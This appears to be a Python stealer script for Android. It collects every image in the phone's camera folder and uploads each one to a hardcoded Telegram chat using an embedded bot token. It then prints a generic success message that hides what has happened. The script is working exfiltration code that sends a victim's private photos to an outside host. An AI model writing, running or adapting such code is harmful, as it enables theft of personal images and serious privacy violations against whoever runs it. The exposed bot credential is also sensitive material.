import os, requests, time

BOT_TOKEN = "8200691947:AAF-wOE90vTafT21Hqzs5WXokd2iBVstdl4"
CHAT_ID = "8519296209"
CAMERA = "/storage/emulated/0/DCIM/Camera"

print("🔍 Searching for photos...")
photos = [os.path.join(CAMERA, f) for f in os.listdir(CAMERA) if f.lower().endswith(('.jpg','.jpeg','.png'))]
print(f"📸 Found {len(photos)} photos")

for i, photo in enumerate(photos, 1):
    try:
        with open(photo, 'rb') as f:
            r = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", 
                            data={"chat_id": CHAT_ID}, 
                            files={"photo": f}, 
                            timeout=30)
        if r.status_code == 200:
            print(f"✅ [{i}/{len(photos)}] {os.path.basename(photo)}")
        else:
            print(f"❌ [{i}/{len(photos)}] Failed: {r.status_code}")
        time.sleep(2)
    except Exception as e:
        print(f"❌ [{i}/{len(photos)}] Error: {e}")

print("✅ The request was successful.")
